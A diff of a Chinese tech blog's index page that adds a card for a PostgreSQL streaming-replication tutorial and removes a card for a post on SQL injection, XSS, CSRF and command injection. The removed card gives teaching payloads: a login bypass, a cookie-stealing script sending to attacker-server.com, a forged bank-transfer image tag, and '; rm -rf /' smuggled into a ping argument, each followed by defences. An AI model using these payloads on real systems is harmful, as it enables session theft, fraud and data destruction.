@@ -105,7 +105,7 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/my-blog/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
-  </li><li class="menu-item menu-item-archives"><a href="/my-blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">65</span></a>
+  </li><li class="menu-item menu-item-archives"><a href="/my-blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">66</span></a>
   </li><li class="menu-item menu-item-tags"><a href="/my-blog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤<span class="badge">48</span></a>
       <ul class="sub-menu">
   
@@ -393,7 +393,7 @@
     <li class="menu-item-child">
       <a href="/my-blog/tags/System-design/">
         System design
-        <span class="post-count">(1)</span>
+        <span class="post-count">(2)</span>
       </a>
     </li>
   
@@ -485,7 +485,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/my-blog/archives/">
-          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -510,6 +510,92 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block post-card">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/08/12/SQL%20Replication%20%E8%A9%B3%E8%A7%A3%20%E5%BE%9E%E5%95%8F%E9%A1%8C%E6%A0%B9%E6%BA%90%E5%88%B0%20PostgreSQL%20%E5%AF%A6%E6%88%B0%E6%BC%94%E7%B7%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/my-blog/images/avatar.gif">
+      <meta itemprop="name" content="Kaiwii">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的技術部落格">
+      <meta itemprop="description" content="分享程式技術">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 我的技術部落格">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/my-blog/2025/08/12/SQL%20Replication%20%E8%A9%B3%E8%A7%A3%20%E5%BE%9E%E5%95%8F%E9%A1%8C%E6%A0%B9%E6%BA%90%E5%88%B0%20PostgreSQL%20%E5%AF%A6%E6%88%B0%E6%BC%94%E7%B7%B4/" class="post-title-link" itemprop="url">
+              SQL Replication 詳解：從問題根源到 PostgreSQL 實戰演練
+            </a>
+            <a href="/my-blog/2025/08/12/SQL%20Replication%20%E8%A9%B3%E8%A7%A3%20%E5%BE%9E%E5%95%8F%E9%A1%8C%E6%A0%B9%E6%BA%90%E5%88%B0%20PostgreSQL%20%E5%AF%A6%E6%88%B0%E6%BC%94%E7%B7%B4/" class="card-link-overlay"></a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">發表於</span>
+      
+
+      <time title="創建時間：2025-08-12 00:00:00 / 修改時間：23:25:43" itemprop="dateCreated datePublished" datetime="2025-08-12T00:00:00+08:00">2025-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分類於</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/my-blog/categories/%E6%8A%80%E8%A1%93%E7%AD%86%E8%A8%98/" itemprop="url" rel="index"><span itemprop="name">技術筆記</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <div class="post-card-content">在現代應用程式架構中，資料庫的穩定性與效能是支撐服務的基石。然而，當服務只有一台資料庫伺服器時，就像把所有雞蛋放在同一個籃子裡，充滿了風險。這時，「Replication」（複寫）就成了保障系統穩健的關鍵技術。 這篇文章將深入探討： SQL Replication 究竟解決了哪些核心問題？ 它的運作原理與應用場景是什麼？ 如何以 PostgreSQL 為例，一步步搭建起一套複寫環境？ 問題的根源：單一資料庫的困境 想像一下，如果整個服務只依賴一台資料庫伺服器，可能會面臨以下幾個令人頭痛的問題： 單點故障 (Single Point of Failure) 問題：如果這台唯一的資料庫因硬體故障、系統崩潰或網路中斷而停機，整個應用程式將會完全癱瘓。這意味著服務中斷、用戶流失與營收損失。 Replication 的解法：透過建立一個或多個備用資料庫（Replica），當主要資料庫（Primary）發生故障時，可以快速切換到備用資料庫，實現高可用性 (High Availability)，大幅縮短服務中斷時間。 讀取效能瓶頸 (Read Performance Bottleneck) 問題：隨著用戶量增長，讀取請求（例如：查詢商品、瀏覽文章）會遠多於寫入請求（例如：下訂單、發表評論）。所有讀寫請求都集中在同一台伺服器上，會導致資料庫負載過高，查詢變慢，影響用戶體驗。 Replication 的解法：可以將讀取請求導向到 Replica 伺服器，而 Primary 伺服器專注處理寫入請求。這種讀寫分離 (Read-Write Splitting) 的架構能有效分攤負載 (Load Balancing)，提升整體的讀取效能與擴展性。 數據分析與報表產生的效能衝擊 問題：營運或數據分析團隊經常需要執行複雜且耗時的 SQL 查詢來產生報表。這些重量級的查詢會佔用大量 CPU 和 I/O 資源，拖慢線上正在服務用戶的資料庫效能。 Replication 的解法：可以指定一台 Replica 作為專門的報表或分析伺服器。分析團隊可以在這台伺服器上盡情執行複雜查詢，而不會影響到線上服務的穩定性。 異地備份與災難恢復 (Disaster Recovery) 問題：如果整個機房因天災（如火災、地震）或人為事故而損毀，即使有本地備份也無濟於事。 Replication 的解法：可以在不同地理位置的機房建立 Replica。這樣即使主要機房發生毀滅性災難，遠端的 Replica 依然保有完整的資料，確保業務能夠在最短時間內恢復。 Replication 的應用原理 SQL Replication 的核心思想很簡單：將一台資料庫（Primary）上的資料變更，持續、自動地複製到另一台或多台資料庫（Replica）上。 這個過程通常是這樣運作的： 寫入日誌 (Write-Ahead Log, WAL)：當 Primary 資料庫執行一個寫入操作（INSERT, UPDATE, DELETE）時，它會先將這個變更記錄到一個稱為「交易日誌」的檔案中。在 PostgreSQL 中，這個日誌被稱為 WAL。 傳送日誌 (Log Shipping)：Primary 伺服器會將這些新產生的 WAL 記錄，透過網路傳送給所有連接它的 Replica 伺服器。 重放日誌 (Log Replay)：Replica 伺服器收到 WAL 記錄後，會按照順序「重放」(Replay) 這些變更，從而將自己的資料狀態與 Primary 保持一致。 根據傳送與確認機制的不同，Replication 主要分為兩種類型： 非同步複寫 (Asynchronous Replication)：Primary 執行完交易後，不等待 Replica 確認收到，直接回應客戶端。優點是效能高，對主資料庫影響小；缺點是在主庫故障的瞬間，可能有極少數已提交的交易還沒傳到備庫，造成微量資料遺失。這是最常見的設定。 同步複寫 (Synchronous Replication)：Primary 執行完交易後，必須等待至少一台 Replica 確認已收到並寫入日誌，才回應客戶端。優點是能保證資料零遺失；缺點是會增加寫入延遲，影響主資料庫效能。 實戰演練：設定 PostgreSQL Streaming Replication 接下來，將動手設定 PostgreSQL 最常見的 串流複寫 (Streaming Replication)，它是一種高效的非同步複寫方式。 假設環境： Primary Server: IP 192.168.1.100 Replica Server: IP 192.168.1.101 兩台伺服器都已安裝相同主版本的 PostgreSQL (e.g., PostgreSQL 17)。 步驟一：設定 Primary Server (192.168.1.100) 1. 修改 postgresql.conf 找到並修改以下參數，讓資料庫監聽所有網路介面，並啟用複寫功能。 # /var/lib/pgsql/17/data/postgresql.conf listen_addresses = &#x27;*&#x27; # 允許來自任何 IP 的連線 wal_level = replica # 設定 WAL 記錄等級為 replica，包含足夠複寫的資訊 max_wal_senders = 5 # 設定最多允許多少個複寫連線 wal_keep_size = 512MB # 保留一定量的 WAL 檔案，防止 Replica 落後太多而連不上 2. 修改 pg_hba.conf 以允許 Replica 連線 加入一行設定，允許我們為複寫建立的特定使用者從 Replica 的 IP 連接。 # /var/lib/pgsql/17/data/pg_hba.conf # 在檔案末尾加入下面這行 # TYPE DATABASE USER ADDRESS METHOD host replication replicator 192.168.1.101/32 scram-sha-256 注意: METHOD 在較新版 PostgreSQL 預設為 scram-sha-256，舊版可能是 md5。請依據 password_encryption 設定。 3. 建立一個複寫專用的使用者 登入 psql，建立一個具備 REPLICATION 權限的使用者。 CREATE ROLE replicator WITH REPLICATION LOGIN PASSWORD &#x27;YourStrongPassword&#x27;; 4. 重啟 Primary PostgreSQL 服務 讓所有設定生效。 sudo systemctl restart postgresql-17 步驟二：設定 Replica Server (192.168.1.101) 1. 停止 Replica 上的 PostgreSQL 服務 因為要用 Primary 的資料覆蓋它。 sudo systemctl stop postgresql-17 2. 清空資料目錄並從 Primary 備份資料 使用 pg_basebackup 工具，它會將 Primary 當前的所有資料完整地複製過來。 # 先把舊的資料目錄清空或備份 sudo mv /var/lib/pgsql/17/data /var/lib/pgsql/17/data_old # 執行基礎備份 sudo -u postgres pg_basebackup -h 192.168.1.100 -U replicator -p 5432 -D /var/lib/pgsql/17/data -Fp -Xs -P -R 參數說明: -h: Primary Server 的 IP -U: 複寫使用者的名稱 -D: Replica Server 的資料存放目錄 -Fp: 格式為純文字 (plain) -Xs: 備份期間產生的 WAL 也一併串流過來 -P: 顯示進度 -R: 非常重要！ 此參數會自動在資料目錄中建立 standby.signal 檔案，並在 postgresql.auto.conf 中寫入連線資訊 (primary_conninfo)，讓 PostgreSQL 啟動時知道自己是備用伺服器。 3. 檢查設定檔 (由 -R 參數自動生成) pg_basebackup 的 -R 參數會自動幫我們完成大部分設定。 它會在 /var/lib/pgsql/17/data/ 目錄下建立一個空的 standby.signal 檔案，這個檔案是告知 PostgreSQL 以備用模式啟動的標記。 它會在 /var/lib/pgsql/17/data/postgresql.auto.conf 中寫入類似這樣的連線字串：primary_conninfo = &#x27;user=replicator password=YourStrongPassword host=192.168.1.100 port=5432 sslmode=prefer sslcompression=0 gssencmode=prefer krbsrvname=postgres target_session_attrs=any&#x27; 步驟三：啟動並驗證複寫 1. 啟動 Replica Server 的 PostgreSQL 服務 sudo systemctl start postgresql-17 2. 驗證複寫狀態 在 Replica Server 上檢查日誌： sudo tail -f /var/lib/pgsql/17/pg_log/postgresql-*.log 會看到類似 started streaming WAL from primary at... 的訊息。 在 Primary Server 上查詢複寫狀態： 登入 psql，執行以下查詢： SELECT * FROM pg_stat_replication; 如果一切正常，會看到一行記錄，其中 client_addr 是 192.168.1.101，state 是 streaming。 3. 進行測試 在 Primary Server 上建立一個新的資料表並插入資料：CREATE TABLE replication_test (id INT, message TEXT); INSERT INTO replication_test VALUES (1, &#x27;Hello from Primary!&#x27;); 稍等一兩秒，在 Replica Server 上查詢該資料表：-- 連接到 Replica 的 psql SELECT * FROM replication_test; 能立即看到剛剛插入的資料，代表已成功搭建起一套 PostgreSQL Streaming Replication。 結論 SQL Replication 是現代化應用程式架構中不可或缺的一環。它從根本上解決了單點故障、效能瓶頸和災難恢復等核心痛點。基於此架構，可以進一步探索自動故障轉移 (Automatic Failover)、負載平衡等更進階的主題。</div>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-card-readmore">
+          <a href="/my-blog/2025/08/12/SQL%20Replication%20%E8%A9%B3%E8%A7%A3%20%E5%BE%9E%E5%95%8F%E9%A1%8C%E6%A0%B9%E6%BA%90%E5%88%B0%20PostgreSQL%20%E5%AF%A6%E6%88%B0%E6%BC%94%E7%B7%B4/" class="btn">
+            閱讀全文 &raquo;
+          </a>
+        </div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1274,92 +1360,6 @@
     <footer class="post-footer">
         <div class="post-card-readmore">
           <a href="/my-blog/2025/08/01/%E6%95%8F%E6%8D%B7%E9%96%8B%E7%99%BC%20%E7%94%A8%20Scrum%20%E8%88%87%20Kanban%20%E6%89%93%E9%80%A0%E9%AB%98%E6%95%88%E5%8D%94%E4%BD%9C%E7%9A%84%E5%9C%98%E9%9A%8A/" class="btn">
-            閱讀全文 &raquo;
-          </a>
-        </div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block post-card">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/my-blog/images/avatar.gif">
-      <meta itemprop="name" content="Kaiwii">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的技術部落格">
-      <meta itemprop="description" content="分享程式技術">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 我的技術部落格">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">
-              一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞
-            </a>
-            <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="card-link-overlay"></a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">發表於</span>
-      
-
-      <time title="創建時間：2025-07-31 00:00:00 / 修改時間：23:28:24" itemprop="dateCreated datePublished" datetime="2025-07-31T00:00:00+08:00">2025-07-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分類於</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/my-blog/categories/%E6%8A%80%E8%A1%93%E7%AD%86%E8%A8%98/" itemprop="url" rel="index"><span itemprop="name">技術筆記</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <div class="post-card-content">當我們精心打造一個網站或應用程式時，就像建築師蓋起一棟美麗的房子。我們專注於它的外觀、功能與使用者體驗。但如果忽略了門窗的鎖，再華麗的房子也可能被輕易闖入。在網路世界裡，這些「鎖」就是資訊安全防護。 本篇文章將帶領大家認識四種最常見、也最基礎的網站安全漏洞：SQL Injection、XSS、CSRF 與 Command Injection。它們就像是數位世界裡的小偷與駭客最愛用的幾把萬能鑰匙。 什麼是網站安全漏洞？ 網站安全漏洞（Web Security Vulnerability）是指網站應用程式在設計或實作上的缺陷，讓攻擊者有機會執行惡意行為，例如竊取資料、癱瘓服務，或欺騙使用者。 接下來，我們來逐一說明這四個網站安全漏洞。它們主要屬於「Application Security (應用程式安全)」的範疇，而 Application Security 又是「Cyber Security (資訊安全)」的核心支柱之一。 漏洞的根源：這四種漏洞都源自於應用程式的程式碼撰寫不安全或設計有缺陷。它們不是因為路由器設定錯誤或網路傳輸協定（如 TCP/IP）本身有問題而產生的。 攻擊的層級：它們都發生在 OSI 模型的第 7 層——應用層。攻擊者是透過與網站應用程式互動（例如提交表單、點擊連結）來發動攻擊。 1. SQL Injection (SQL 資料隱碼攻擊) 攻擊原理：當應用程式需要與資料庫溝通時（例如，使用者登入、查詢商品），它會發送 SQL (Structured Query Language) 指令。如果程式沒有妥善過濾使用者的輸入，攻擊者就可以在輸入欄位中「注入」惡意的 SQL 指令，讓資料庫誤以為這是合法的指令，從而執行一些不該做的事。 攻擊情境： 想像一個登入表單，原本的 SQL 查詢可能長這樣： SELECT * FROM users WHERE username = &#x27;使用者輸入的帳號&#x27; AND password = &#x27;使用者輸入的密碼&#x27;; 如果攻擊者在密碼欄位輸入 ' OR '1'='1，整個 SQL 指令就會變成： SELECT * FROM users WHERE username = &#x27;some_user&#x27; AND password = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;; 由於 '1'='1' 永遠為真（True），這個查詢條件就相當於「密碼無論如何都正確」，攻擊者因此成功繞過驗證，直接登入系統。更糟的是，他們還可能用來刪除整個資料庫 (DROP TABLE)！ 防禦策略： 參數化查詢 (Parameterized Queries) / 預處理陳述 (Prepared Statements)：這是最有效的方法。它會先將 SQL 指令的「模板」發送到資料庫，再把使用者的輸入當作「參數」傳入。這樣一來，資料庫就能明確區分「指令」和「資料」，惡意輸入只會被當成純文字資料，無法被執行。 輸入驗證 (Input Validation)：檢查使用者輸入的格式是否符合預期（例如，信箱格式、數字格式）。 2. Cross-Site Scripting (XSS, 跨站腳本攻擊) 如果說 SQL Injection 攻擊的是「後端資料庫」，那麼 XSS 攻擊的目標就是「前端使用者」。 攻擊原理：攻擊者將惡意的 JavaScript 腳本注入到一個網站中。當其他使用者瀏覽到含有這段惡意腳本的頁面時，腳本就會在使用者的瀏覽器上執行。 攻擊情境： 在一個有留言板功能的網站上，攻擊者發表了一篇含有惡意腳本的留言： &lt;p&gt;這是一篇很棒的文章！&lt;/p&gt; &lt;script&gt; // 這段惡意腳本會竊取你的 cookie 並傳送到攻擊者的伺服器 fetch(&#x27;https://attacker-server.com/steal?cookie=&#x27; + document.cookie); &lt;/script&gt; 當下一個訪客（例如你）瀏覽這篇留言時，瀏覽器會毫不懷疑地執行這段 &lt;script&gt;。攻擊者就能輕易偷走你的登入憑證 (Session Cookie)，冒用你的身份進行操作。 防禦策略： 輸出編碼 (Output Encoding)：這是防禦 XSS 的關鍵。在將使用者輸入的內容顯示到頁面上之前，必須對特殊字元進行編碼。例如，將 &lt; 轉換成 &amp;lt;，將 &gt; 轉換成 &amp;gt;。如此一來，瀏覽器只會將其當作純文字顯示，而不是執行它。 內容安全策略 (Content Security Policy, CSP)：透過設定 HTTP Header，告訴瀏覽器只信任並執行來自指定來源的腳本，有效阻擋非預期的腳本執行。 3. Cross-Site Request Forgery (CSRF, 跨站請求偽造) CSRF 是一種非常狡猾的攻擊，它「借用」了你的身份去辦壞事。 攻擊原理：攻擊者誘騙一個已經登入某網站的使用者，在不知情的情況下，點擊一個惡意連結或載入一個惡意頁面。這個惡意頁面會向使用者已登入的網站發送一個偽造的請求（Request）。由於這個請求是從使用者自己的瀏覽器發出的，且會自動帶上該網站的 Cookie，因此被攻擊的網站會認為這是使用者本人的合法操作。 攻擊情境： 登入了網路銀行 mybank.com。 接著，收到一封 Email，標題是「快來看可愛貓咪！」，裡面有一個連結指向 evil-cat-site.com。 點擊了連結，evil-cat-site.com 的頁面裡藏了一段程式碼，例如一個看不見的圖片：&lt;img src=&quot;https://mybank.com/transfer?to=attacker&amp;amount=10000&quot; width=&quot;1&quot; height=&quot;1&quot;&gt; 瀏覽器為了載入這張「圖片」，會向 mybank.com 發出一個轉帳請求，並且自動附上你的登入 Cookie。 銀行伺服器收到請求，驗證 Cookie 後認為是你本人的操作，於是就把錢轉出去了。整個過程你可能毫無察覺。 防禦策略： 使用 Anti-CSRF Token：這是在伺服器端產生一個隨機、無法預測的 Token，並將其放在表單中。當使用者提交表單時，伺服器會驗證這個 Token 是否正確。由於攻擊者在 evil-cat-site.com 上無法得知這個 Token，他偽造的請求就會因為缺少或 Token 錯誤而被拒絕。 檢查 Referer Header：檢查請求的來源頁面是否為合法的網域，但此方法可能被繞過。 使用 SameSite Cookie 屬性：將 Cookie 設置為 SameSite=Strict 或 SameSite=Lax，可以限制 Cookie 在跨站請求中被發送，是現今瀏覽器的主流防禦方式之一。 4. Command Injection (命令注入攻擊) 這種攻擊的危險性與 SQL Injection 不相上下，但它攻擊的目標是「伺服器的作業系統」。 攻擊原理：當應用程式需要呼叫作業系統的命令（例如 ping、ls、rm 等），且直接將使用者的輸入作為命令的一部分時，攻擊者可以注入額外的系統命令，讓伺服器執行意料之外的操作。 攻擊情境： 網站提供一個功能，讓使用者可以 PING 一個 IP 位址來檢查網路狀況。後端程式碼可能是這樣的 (以 PHP 為例)： $ip = $_POST[&#x27;ip_address&#x27;]; system(&quot;ping -c 4 &quot; . $ip); 如果攻擊者輸入的 IP 是 8.8.8.8; rm -rf /，那麼在伺服器上執行的命令就會變成： ping -c 4 8.8.8.8; rm -rf / 系統會先執行合法的 PING 指令，然後接著執行 rm -rf /（刪除根目錄下所有檔案）這個毀滅性的指令。 防禦策略： 避免直接呼叫系統命令：盡可能使用語言內建的函式庫或 API 來完成功能，而不是拼接字串去呼叫系統命令。這是最安全的做法。 嚴格的輸入白名單 (Whitelist)：如果非得使用系統命令，務必建立一個「白名單」，只允許輸入符合特定格式的字元（例如，只允許數字和點 .），過濾掉所有其他特殊字元（如 ;, |, &amp; 等）。 四大網路安全漏洞比較 漏洞類型 攻擊目標 攻擊手法簡述 主要防禦策略 SQL Injection 後端資料庫 在使用者輸入中注入惡意 SQL 指令，欺騙資料庫執行。 參數化查詢 (Prepared Statements) XSS 前端使用者瀏覽器 在網頁中注入惡意 JavaScript，在他人瀏覽器上執行。 輸出內容編碼 (Output Encoding) CSRF 已登入的使用者 誘騙使用者點擊連結，以其身份向伺服器發送偽造請求。 使用 Anti-CSRF Token Command Injection 伺服器作業系統 在使用者輸入中注入惡意系統命令，讓伺服器執行。 避免呼叫系統命令 / 嚴格白名單驗證 總結 網站安全是一場永無止境的攻防戰。今天介紹的四種漏洞只是冰山一角，但它們是每個開發者都必須掌握的基礎知識。了解攻擊者的思維，才能更好地設計出堅不可摧的防禦工事。 記住，安全的程式碼不是「寫完就好」，而是在開發的每一個環節中，都將安全性放在心上。讓我們一起努力，打造一個更安全、更值得信賴的網路世界！</div>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-card-readmore">
-          <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="btn">
             閱讀全文 &raquo;
           </a>
         </div>
